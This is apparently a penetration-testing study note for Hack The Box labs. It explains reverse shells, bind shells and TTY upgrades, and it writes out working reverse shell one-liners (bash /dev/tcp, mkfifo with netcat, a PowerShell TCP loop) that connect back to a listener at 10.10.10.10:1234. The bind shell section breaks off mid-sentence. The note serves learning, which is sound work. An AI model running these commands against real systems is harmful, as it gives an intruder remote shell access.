A `shell` is a *program that takes input from the user via the keyboard and passes these commands to the operating system*. Practically speaking, it's **just the terminal command line.**
To **obtain a shell** means that we have successfully **forced the target machine to give us a remote CLI**. 
There are three types of shells:
## Reverse Shell
#### Description
An attack where the victim computer initiates the network connection back to the attacker’s machine, handing over its command line terminal.

Reverse shells are handy when we want a quick, reliable connection to our compromised victim, but can be very fragile. Once it is stopped, or if we lose our connection, we have to re-use the exploit to execute the reverse shell again and regain access.
### How it works
1. The attacker starts a listener program (like Netcat) on their machine and waits.
2. The attacker uses an exploit (RCE) to make the victim run a network command.
3. The victim computer dials out to the attacker's specific IP address and port, opening the line.
### Why it works
1. **Firewalls block inside traffic, not outside traffic.**
	1. Security systems are set up to strictly block random connections trying to get *in* from the internet. However, they are lax about letting internal computers connect *out* (like loading a website or checking updates).
2. **The "Established" rule loophole.**
	1. Because the victim started the call from the inside, the firewall approves the connection and opens up a two-way highway for that conversation. The attacker can now slide any command they want back down that approved highway.
### Setting Up
#### Step 1: Listener
We being by setting up a [[netcat]] listener on a port of our choosing:

```bash
$ nc -lvnp 1234
listening on [any] 1234 ...
```
#### Step 2: Connect Back IP
We now have a `netcat` listener waiting for a connection, so we can execute the reverse shell command that connects the victim back to us.
First, we need to find our system's IP so we know where to send the connection:

```bash
$ ip a
...SNIP... 
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN 
group default qlen 500 
	link/none 
	inet 10.10.10.10/23 scope global tun0 
...SNIP...
```

> We are connecting to the IP in `tun0` because we can only connect to HTB boxes through the VPN connection, as they do not have internet access. In a real scenario, we may directly connect through `eth0`.

#### Step 3: Reverse Shell Command
The command we run depends on the victims OS, and what applications we can access. [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) has a comprehensive list of reverse shell commands that covers a wide range of compromised hosts.

Here are a few examples of more reliable reverse shell commands for both Linux and Windows:

```bash
# Linux
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1' # Linux
```
```bash
# Linux
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```
```powershell
# Linux
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

Once we've utilised an exploit to execute one of the above commands, we should receive a connection in our `netcat` listener:

```bash
listening on [any] 1234 ... 
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572 

id # Input
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Once we receive our connection, we're able to type a command (in this case `id`) and get its output back, all on our machine.

---
## Bind Shell
### Description
The opposite of a `reverse` shell. The victim is forced to open a new port on itself and attach its terminal directly to that port, which the attacker then connects to.
### How it works
1. The attacker uses an exploit to force the victim to run a background listener.
2. The victim binds its terminal to that listener port.
3. The attacker manually connects inward to that port.
### Why it works
These are the scenarios in which `bind` shells are used:
1. **The firewall is poorly configured.** 
	1. For example, a third-party might've demanded that all ports be left open to make integration of their software easier, which if not cleaned allows the attacker to take control of a random unused port.
2. **The attacker has already obtained access to the internal network, and is using it for lateral movement.**
	1. Most networks focus money and effort on securing the network from the outside, assuming that this is where attacks will originate. This means that once the internal network is compromised, there is little in place to stop an attacker.
	2. This could look like obtaining a reverse shell, and then connecting a bind shell from that machine to an adjacent internal machine.
3. **The attacker hijacks an already approved port.**
	1. An e-commerce site, for example, must let `HTTP` and `HTTPS` traffic in, meaning ports 80 and 443 are open to the outside world. 
	2. An attacker might kill the legitimate web server, and then bind a shell to the now open port. The firewall has already approved communication on port 443, so it sees nothing wrong.

### Setting Up
#### Step 1: Bind Shell Command

Once again, we look to 

---
## TTY Upgrade
### Description
An optimisation process used immediately after catching a raw shell to convert a fragile, dumb connection into a stable terminal.
TTY differ from a regular shell in that it behaves like a terminal. The other shells are essentially hacky ways to get the functionality of a terminal, whereas a TTY *is* a terminal.
### How it works
1. When you first catch a shell via Netcat, it is just a dumb text pipe. It lacks keyboard features and system variables.
2. The attacker runs a sequence of scripts on the victim (like Python) to force the OS to generate a real pseudo-terminal interface.
3. The attacker tweaks their local terminal settings to pass keyboard shortcuts straight through the network.
### Why it works
These are the reasons why a `TTY Upgrade` is mandatory during a hack:
1. **The shell is too fragile.** 
	1. In a raw netcat shell, if you make a typo, you cannot use the left arrow key to go back and fix it. Pressing it just prints garbage characters like `^[[D`.
2. **Accidental disconnects.**
	1. If you run a command that hangs and you instinctively press `Ctrl + C` to stop it, you will kill your entire network connection instead of just the command. You have to exploit the machine all over again.
3. **Interactive commands fail.**
	1. Programs that require user interaction or text layouts (like `sudo`, `mysql`, or text editors like `nano`) will completely freeze or refuse to run because they don't detect a real terminal on your end. The upgrade tricks the OS into thinking a physical keyboard is plugged into the server.
